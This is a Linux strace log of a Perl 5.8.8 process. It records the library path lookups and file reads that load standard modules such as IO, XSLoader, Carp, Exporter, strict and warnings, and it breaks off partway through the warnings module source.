10195 07:31:50.917130 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917143 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917156 stat64("/usr/lib/perl5/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917168 stat64("/usr/lib/perl5/IO.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917180 stat64("/usr/share/perl5/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917192 stat64("/usr/share/perl5/IO.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917205 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917218 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
10195 07:31:50.917238 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.917251 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.917262 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.917285 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
10195 07:31:50.917399 stat64("/etc/perl/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917413 stat64("/etc/perl/XSLoader.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.917426 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917438 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.917452 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917465 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.917482 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917494 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.917507 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917519 stat64("/usr/share/perl5/XSLoader.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.917532 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917544 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
10195 07:31:50.917565 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.917578 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.917589 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.917606 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
10195 07:31:50.917891 brk(0x8195000)    = 0x8195000
10195 07:31:50.918189 _llseek(8, 3407, [3407], SEEK_SET) = 0
10195 07:31:50.918206 _llseek(8, 0, [3407], SEEK_CUR) = 0
10195 07:31:50.918217 close(8)          = 0
10195 07:31:50.918260 stat64("/etc/perl/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918275 stat64("/etc/perl/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918302 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918343 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918357 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918387 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918400 stat64("/usr/lib/perl5/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918412 stat64("/usr/lib/perl5/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918424 stat64("/usr/share/perl5/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918436 stat64("/usr/share/perl5/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918449 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918461 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.918474 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.918487 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
10195 07:31:50.918508 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.918522 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.918533 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.918550 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
10195 07:31:50.919023 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
10195 07:31:50.919050 read(8, "", 4096) = 0
10195 07:31:50.919062 close(8)          = 0
10195 07:31:50.919083 stat64("/etc/perl/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919096 stat64("/etc/perl/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919110 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919123 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919137 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919149 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919163 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919174 stat64("/usr/lib/perl5/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919187 stat64("/usr/share/perl5/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919199 stat64("/usr/share/perl5/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919213 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919229 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.919243 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.919255 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
10195 07:31:50.919276 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.919307 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.919348 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.919384 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
10195 07:31:50.919968 _llseek(8, 2217, [2217], SEEK_SET) = 0
10195 07:31:50.919986 _llseek(8, 0, [2217], SEEK_CUR) = 0
10195 07:31:50.919997 close(8)          = 0
10195 07:31:50.920070 stat64("/etc/perl/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920086 stat64("/etc/perl/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920099 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920112 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920126 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920138 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920152 stat64("/usr/lib/perl5/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920164 stat64("/usr/lib/perl5/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920181 stat64("/usr/share/perl5/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920192 stat64("/usr/share/perl5/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920206 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920218 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.920231 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.920244 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
10195 07:31:50.920265 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.920279 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.920291 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.920310 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
10195 07:31:50.921041 _llseek(8, 598, [598], SEEK_SET) = 0
10195 07:31:50.921056 _llseek(8, 0, [598], SEEK_CUR) = 0
10195 07:31:50.921066 close(8)          = 0
10195 07:31:50.921104 stat64("/etc/perl/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921119 stat64("/etc/perl/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921132 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921144 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921158 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921171 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921185 stat64("/usr/lib/perl5/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921197 stat64("/usr/lib/perl5/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921209 stat64("/usr/share/perl5/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921221 stat64("/usr/share/perl5/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921234 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921247 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.921260 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.921273 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
10195 07:31:50.921293 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.921308 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.921319 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.921336 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    